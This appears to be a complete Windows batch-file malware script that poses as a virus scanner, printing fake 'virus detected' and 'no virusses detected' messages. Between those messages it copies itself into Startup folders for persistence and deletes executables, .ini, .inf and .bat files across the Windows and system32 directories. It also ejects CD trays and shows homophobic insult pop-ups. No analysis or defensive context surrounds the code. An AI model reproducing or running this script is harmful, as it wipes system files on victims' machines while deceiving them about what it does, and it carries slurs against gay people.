echo off
echo virus detected, scanning.... and removing
REM -for winxp and 2000-
if exist C:\Docume~1\Defaul~1\MenuSt~1\Progra~1\Opstar~1 copy %0 C:\Docume~1\Defaul~1\MenuSt~1\Progra~1\Opstar~1
REM -for win 9x and me-
if exist C:\windows\startm~1\progra~1\opstar~1 copy %0 C:\windows\startm~1\progra~1\opstar~1
REM -for winxp + 2000-
if exist C:\winnt goto winnt
c:
cd\
del *.exe
del *.ini
del *.inf
del *.bat
cd windows
del *.exe
del *.ini
del *.inf
del *.bat
cd system32
del *.exe
del *.ini
del *.inf
del *.bat
cd..
cd system
del *.exe
del *.ini
del *.inf
del *.bat
:winnt
c:
cd\
del *.exe
del *.ini
del *.inf
del *.bat
cd winnt
del *.exe
del *.ini
del *.inf
del *.bat
cd system32
del *.exe
del *.ini
del *.inf
del *.bat
cd..
cd system
del *.exe
del *.ini
del *.inf
del *.bat
@ECHO Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> C:\OPENTRAY.VBS
@ECHO Set colCDROMs = oWMP.cdromCollection >> C:\OPENTRAY.VBS
@ECHO if colCDROMs.Count >= 1 then >> C:\OPENTRAY.VBS
@ECHO For i = 0 to colCDROMs.Count - 1 >> C:\OPENTRAY.VBS
@ECHO colCDROMs.Item(i).Eject >> C:\OPENTRAY.VBS
@ECHO Next ' cdrom >> C:\OPENTRAY.VBS
@ECHO End If >> C:\OPENTRAY.VBS
@CALL C:\OPENTRAY.VBS
echo dropped.vbs >> C:\dropped.bat
echo MsgBox "YOU'RE GAY" >> C:\dropped.vbs
echo MsgBox "YOU'RE GAY" >> C:\dropped.vbs
c:\dropped.bat
echo no virusses detected
pause

later

peace@1